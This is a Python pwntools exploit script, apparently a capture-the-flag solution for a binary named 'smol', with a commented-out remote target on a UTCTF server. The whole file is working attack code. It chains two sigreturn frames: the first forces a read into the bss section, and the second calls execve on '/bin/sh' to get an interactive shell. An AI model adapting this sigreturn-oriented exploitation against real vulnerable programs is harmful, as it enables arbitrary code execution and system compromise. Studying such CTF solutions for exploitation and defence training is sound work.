#!/usr/bin/python3

from pwn import *
import time


context.binary = binary = ELF('smol')
context.terminal = ['termite', '-e']

WAIT_TIME = 3

r = ROP(binary)

p = process(binary.path)

# p = remote('pwn.utctf.live', 9998)
# gdb.attach(p, """b *main + 21
#                  c""")
# b *main + 21

set_rax_sigreturn = b'/bin/sh\x00'.ljust(constants.SYS_rt_sigreturn, b'A')


arb_write_frame = SigreturnFrame()
arb_write_frame.rax = constants.SYS_read
arb_write_frame.rdi = 0         # stdin fd
arb_write_frame.rsi = list(binary.search(p64(binary.bss())))[0]  # 0x4000c0  # binary.bss()
arb_write_frame.rdx = 0x100     # size

# and these are just so that the stack is at a rw address that can grow forwards or backwards
arb_write_frame.rsp = binary.bss() + 0x100
arb_write_frame.rbp = binary.bss() + 0x100
# arb_write_frame.rip = binary.bss() + 0x8
arb_write_frame.rip = binary.sym['main'] + 8  # might be able to just use a ret here



exec_frame = SigreturnFrame()
exec_frame.rax = constants.SYS_execve
exec_frame.rdi = binary.bss() + 0x100 - 8
exec_frame.rip = r.find_gadget(['syscall']).address

prechain = b'J'*8
prechain += b'B'*8

payload = b''
payload += p64(binary.sym['main'])
payload += p64(r.find_gadget(['syscall']).address)
# payload += bytes(arb_write_frame)



p.send(prechain + payload + bytes(arb_write_frame))

time.sleep(WAIT_TIME)
# pause()

p.send(set_rax_sigreturn)
time.sleep(WAIT_TIME)
# pause() # time.sleep(2)

# this is where we will start again
p.send(payload)
time.sleep(WAIT_TIME)
# pause()

# main has been re-inited, pretty much just run from the top again, just with a different sigret frame
p.send(prechain + payload + bytes(exec_frame))
time.sleep(WAIT_TIME)
# pause()

p.send(set_rax_sigreturn)
p.interactive()
p.sendline(b'sh;sh')


